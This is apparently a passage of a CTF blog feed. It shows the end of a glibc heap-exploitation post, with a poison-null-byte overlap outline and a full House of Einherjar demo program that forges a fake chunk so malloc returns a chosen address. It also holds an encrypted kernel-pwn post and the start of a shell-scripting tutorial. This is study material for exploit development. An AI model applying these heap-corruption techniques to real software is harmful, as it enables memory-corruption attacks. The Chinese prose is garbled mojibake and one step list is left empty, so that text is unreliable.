class="built_in">strstr</span>(b2, <span class="string">"DDDDDDDDDDDD"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Âà©Áî®Á©∫Â≠óËäÇË¶ÜÁõñsize‰ΩçÔºå‰ªéËÄåËææÂà∞overlapÁöÑÁõÆÁöÑ</p><p>‰ΩÜËøôÈáå‰ºöÊúâ‰∏Ä‰∏™check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;b=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">&gt;chunksize(P)==prev_size(next_chunk(P))</span><br><span class="line">&gt;#chunksize(P)=*(b<span class="number">-0x8</span>)</span><br><span class="line">&gt;#prev_size(next_chunk(P))=*(b<span class="number">-0x10</span>+*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)))</span><br></pre></td></tr></table></figure><p>Âü∫Êú¨ÊµÅÁ®ãÔºö</p><ol><li>ÂàÜÈÖçÂõõ‰∏™Â†Üa b c dÔºåÊúÄÂêé‰∏Ä‰∏™ÊòØÁî®Êù•ÈòªÊå°top chunkÁöÑ</li><li>Êàë‰ª¨ÈúÄË¶ÅÂÖà‰øÆÊîπcheck‰ΩçÁöÑsizeÔºåÁÑ∂ÂêéÈáäÊîæbÔºåÊúÄÂêéÂà©Áî®aÁöÑÊ∫¢Âá∫‰øÆÊîπbÁöÑsize‰ΩçÔºàÊ≥®ÊÑèËøôÈáåÁöÑcheck‰ºöÂú®‰∏ã‰∏ÄÊâçmallocÊó∂Âá∫Áé∞Ôºâ</li><li>‰πãÂêémalloc b1 b2,b2Â∞±ÊòØÊàë‰ª¨ÈúÄË¶ÅoverlapÁöÑÂú∞Êñπ</li><li>Ê≠§Êó∂free b1 Âíå cÔºàprev_size=0x210ÔºâÂ∞±‰ºöÊääb2 overlapÊéâ</li><li>Âú®malloc‰∏Ä‰∏ãÔºåÊàë‰ª¨Â∞±ËÉΩÊãøÂà∞b2ÁöÑÊùÉÈôê‰∫Ü</li></ol><p>Âà©Áî®Êù°‰ª∂ÔºöÈ¶ñÂÖàÊàë‰ª¨ÂæóÊúâÂèåÈìæË°®Ëøô‰∏™‰∏úË•øÔºå‰πüÂ∞±ÊòØunsorted binÔºàÂõ†‰∏∫fastbin‰∏≠inuseÊ∞∏Ëøú‰∏∫1ÔºâÔºåÂÖ∂Ê¨°ÊúâÁ©∫Â≠óËäÇÊ∫¢Âá∫ÔºåÂÖ∑‰ΩìÊñπÊ≥ïÂ∞±ÊòØÂÖàÊõ¥ÊîπcheckÁöÑsize‰ΩçÔºåÁÑ∂ÂêéËøõË°åÊ∫¢Âá∫</p><p><strong>ÂΩ±ÂìçÔºöÊàë‰ª¨‰∏ªË¶ÅÊòØÊãøÊù•overlapÁöÑ</strong></p></blockquote><h1 id="0x12-house-of-einherjar"><a href="#0x12-house-of-einherjar" class="headerlink" title="0x12 house of einherjar"></a>0x12 house of einherjar</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to House of Einherjar!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe allocate 0x38 bytes for 'a'\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"However, you can also create the chunk in the heap or the bss, as long as you know its address\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"(although we could do the unsafe unlink technique here in some scenarios)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk's size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Our fake chunk at %p looks like:\n"</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"prev_size (not used): %#lx\n"</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"size: %#lx\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fwd: %#lx\n"</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bck: %#lx\n"</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fwd_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bck_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"><span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe allocate 0xf8 bytes for 'b'.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"><span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nb.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size is: (0x100) | prev_inuse = 0x101\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This is easiest if b.size is a multiple of 0x100 so you "</span></span><br><span class="line">   <span class="string">"don't change the size of b, only its prev_inuse bit\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If it had been modified, we would need a fake chunk inside "</span></span><br><span class="line">   <span class="string">"b where it will try to consolidate the next chunk\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe write a fake prev_size to the last %lu bytes of a so that "</span></span><br><span class="line">   <span class="string">"it will consolidate with our fake chunk\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Our fake prev_size will be %p - %p = %#lx\n"</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Change the fake chunk's size to reflect b's new prev_size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nModify fake chunk's size to reflect b's new prev_size\n"</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line"><span class="comment">//do two things: </span></span><br><span class="line"><span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line"><span class="comment">//fake_chunk + fake_chunk's size points to an area we control</span></span><br><span class="line"><span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line"><span class="comment">//at the location we control. </span></span><br><span class="line"><span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line"><span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line"><span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line"><span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nNow we can call malloc() and it will begin in our fake chunk\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Next malloc(0x200) is at %p\n"</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ÊñáÁ´†‰∏ªË¶ÅÂÅö‰∫Ü‰∏Ä‰∏™‰∫ãÔºå<strong>Âà©Áî®freeÁöÑÂêéÂêëÂêàÂπ∂Êäätop chunkËÆæ‰∏∫Êàë‰ª¨‰º™ÈÄ†ÁöÑchunkÂú∞ÂùÄÊù•Âº∫Âà∂mallocÂàÜÈÖçÂà∞Êàë‰ª¨‰º™ÈÄ†ÁöÑÂú∞ÂùÄ</strong></p><p>ÊµÅÁ®ãÔºö</p><ol><li>ÂÖàÂàÜÈÖç‰∏§‰∏™chunkÔºåaÂíåb</li><li></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ÂõûÊ°£Âà∞Â†Ü&lt;/p&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>kernel-pwn</title>
    <link href="https://pz1o.top/2021/05/05/kernel-pwn/"/>
    <id>https://pz1o.top/2021/05/05/kernel-pwn/</id>
    <published>2021-05-05T11:06:54.000Z</published>
    <updated>2021-06-06T13:58:18.441Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>learn shell</title>
    <link href="https://pz1o.top/2021/05/03/learn-shell/"/>
    <id>https://pz1o.top/2021/05/03/learn-shell/</id>
    <published>2021-05-03T12:18:51.000Z</published>
    <updated>2021-06-09T11:45:57.784Z</updated>
    
    <content type="html"><![CDATA[<p>shellÊòØ‰∏™Â•Ω‰∏úË•ø</p><a id="more"></a><p>Â§öÂ≠¶Â§öÁî®</p><h1 id="0x01-ÂèòÈáè"><a href="#0x01-ÂèòÈáè" class="headerlink" title="0x01 ÂèòÈáè"></a>0x01 ÂèòÈáè</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#ÂèòÈáèÂëΩÂêç</span></span><br><span class="line">your_name=pz1o</span><br><span class="line"><span class="comment">#‰ΩøÁî®ÂèòÈáè</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;your_name&#125;</span></span><br><span class="line"><span class="comment">#Âè™ËØªÂèòÈáè</span></span><br><span class="line"><span class="built_in">readonly</span> your_name</span><br><span class="line"><span class="comment">#Âà†Èô§ÂèòÈáè</span></span><br><span class="line"><span class="built_in">unset</span> your_name</span><br></pre></td></tr></table></figure><h2 id="1-ÂèòÈáèÁ±ªÂûã"><a href="#1-ÂèòÈáèÁ±ªÂûã" class="headerlink" title="1. ÂèòÈáèÁ±ªÂûã"></a>1. ÂèòÈáèÁ±ªÂûã</h2><ul><li><strong>1) Â±ÄÈÉ®ÂèòÈáè</strong> Â±ÄÈÉ®ÂèòÈáèÂú®ËÑöÊú¨ÊàñÂëΩ‰ª§‰∏≠ÂÆö‰πâÔºå‰ªÖÂú®ÂΩìÂâçshellÂÆû‰æã‰∏≠ÊúâÊïàÔºåÂÖ∂‰ªñshellÂêØÂä®ÁöÑÁ®ãÂ∫è‰∏çËÉΩËÆøÈóÆÂ±ÄÈÉ®ÂèòÈáè„ÄÇ</li><li><strong>2) ÁéØÂ¢ÉÂèòÈáè</strong> ÊâÄÊúâÁöÑÁ®ãÂ∫èÔºåÂåÖÊã¨shellÂêØÂä®ÁöÑÁ®ãÂ∫èÔºåÈÉΩËÉΩËÆøÈóÆÁéØÂ¢ÉÂèòÈáèÔºåÊúâ‰∫õÁ®ãÂ∫èÈúÄË¶ÅÁéØÂ¢ÉÂèòÈáèÊù•‰øùËØÅÂÖ∂Ê≠£Â∏∏ËøêË°å„ÄÇÂøÖË¶ÅÁöÑÊó∂ÂÄôshellËÑöÊú¨‰πüÂèØ‰ª•ÂÆö‰πâÁéØÂ¢ÉÂèòÈáè„ÄÇ</li><li><strong>3) shellÂèòÈáè</strong> shellÂèòÈáèÊòØÁî±shellÁ®ãÂ∫èËÆæÁΩÆÁöÑÁâπÊÆäÂèòÈáè„ÄÇshellÂèòÈáè‰∏≠Êúâ‰∏ÄÈÉ®ÂàÜÊòØÁéØÂ¢ÉÂèòÈáèÔºåÊúâ‰∏ÄÈÉ®ÂàÜÊòØÂ±ÄÈÉ®ÂèòÈáèÔºåËøô‰∫õÂèòÈáè‰øùËØÅ‰∫ÜshellÁöÑÊ≠£Â∏∏ËøêË°å</li></ul><h2 id="2-Â≠óÁ¨¶‰∏≤"><a href="#2-Â≠óÁ¨¶‰∏≤" class="headerlink" title="2. Â≠óÁ¨¶‰∏≤"></a>2. Â≠óÁ¨¶‰∏≤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#Â≠óÁ¨¶‰∏≤</span></span><br><span class="line">str=<span class="string">"pz1o"</span></span><br><span class="line">hello=<span class="string">"hello <span class="variable">$&#123;str&#125;</span>"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="variable">$&#123;hello&#125;</span></span><br><span class="line"><span class="comment">#Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#str&#125;</span></span><br><span class="line"><span class="comment">#ÊèêÂèñÂ≠óÁ¨¶‰∏≤</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str:1:4&#125;</span></span><br><span class="line"><span class="comment">#ÊèêÂèñÂ≠óÁ¨¶‰∏≤</span></span><br><span class="line"><span class="built_in">echo</span> `expr index <span class="string">"<span class="variable">$&#123;hello&#125;</span>"</span> pz1o`</span><br></pre></td></tr></table></figure><h2 id="3-Êï∞ÁªÑ"><a href="#3-Êï∞ÁªÑ" class="headerlink" title="3. Êï∞ÁªÑ"></a>3. Êï∞ÁªÑ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Êï∞ÁªÑ</span></span><br><span class="line">name=(<span class="string">"pz1o"</span> <span class="string">"CUMT"</span> <span class="string">"PWN"</span>)</span><br><span class="line"><span class="comment">#ËØªÂèñÊï∞ÁªÑ</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;name[0]&#125;</span></span><br><span class="line"><span class="comment">#@ÂèØ‰ª•ËØªÂèñÊâÄÊúâÊï∞ÁªÑ</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;name[@]&#125;</span></span><br><span class="line"><span class="comment">#Ëé∑ÂèñÊï∞ÁªÑÈïøÂ∫¶</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#name[@]&#125;</span></span><br><span class="line"><span class="comment">#Â§öË°åÊ≥®Èáä</span></span><br><span class="line">:&lt;&lt;EOF</span><br><span class="line">...</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h1 id="0x02-‰º†ÈÄíÂèÇÊï∞"><a href="#0x02-‰º†ÈÄíÂèÇÊï∞" class="headerlink" title="0x02 ‰º†ÈÄíÂèÇÊï∞"></a>0x02 ‰º†ÈÄíÂèÇÊï∞</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#author:pz1o</span></span><br><span class="line"><span class="comment">#$0ÊòØÊñá‰ª∂Âêç</span></span><br><span class="line"><span class="comment">#$1 $2 ‰æùÊ¨°‰∏∫ÂêéÈù¢ÁöÑÂèÇÊï∞</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The file name is "</span><span class="variable">$0</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The first argument is "</span><span class="variable">$1</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The second argument is "</span><span 